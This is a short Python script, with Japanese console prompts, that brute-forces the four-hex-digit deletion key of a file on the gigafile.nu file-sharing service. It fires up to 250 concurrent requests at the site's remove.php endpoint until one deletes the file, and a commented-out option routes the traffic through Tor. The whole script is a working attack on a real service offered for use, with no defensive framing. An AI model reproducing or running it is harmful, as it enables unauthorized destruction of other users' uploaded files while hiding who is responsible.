import requests
import threading
import time
import sys

proxies = None
#proxies = {"http":"socks5://localhost:9050/","https":"socks5://localhost:9050/"}
deleted = False
url = input("ファイルurl: ")
serverid = url.split("://")[1].split(".")[0]
filename = url.split(".nu/")[1].split("/")[0].split("?")[0]
hex = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']

def remover(key):
    global deleted
    if deleted == True:return
    while True:
        try:
            print("削除キー試行: "+key)
            status = requests.get("https://"+serverid+".gigafile.nu/remove.php?file="+filename+"&delkey="+key,proxies=proxies,timeout=5).json()["status"]
            if status == 0 and deleted == False:print("削除されました！");deleted = True
            break
        except:continue


for i1 in hex:
    for i2 in hex:
        for i3 in hex:
            for i4 in hex:
                if deleted:break
                num = i1+i2+i3+i4
                threading.Thread(target=remover,args=(num,)).start()
                while threading.active_count() >= 250:time.sleep(1)
